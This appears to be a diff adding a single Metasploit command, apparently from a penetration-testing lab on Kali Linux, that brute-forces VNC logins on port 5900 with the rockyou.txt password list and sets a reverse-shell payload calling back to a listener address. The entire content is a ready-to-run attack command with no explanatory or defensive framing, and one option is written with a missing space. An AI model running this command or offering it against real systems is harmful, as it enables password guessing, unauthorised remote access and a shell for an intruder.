@@ -1,0 +1,8 @@
+ msfconsole -x "use auxiliary/scanner/vnc/vnc_login;\
+
+set payload cmd/unix/reverse;\
+set RPORT 5900;\
+set pass_file/home/kali/Documents/rockyou.txt;\
+set LHOST 192.168.254.182;\
+set RHOST 192.168.254.186;\
+exploit"
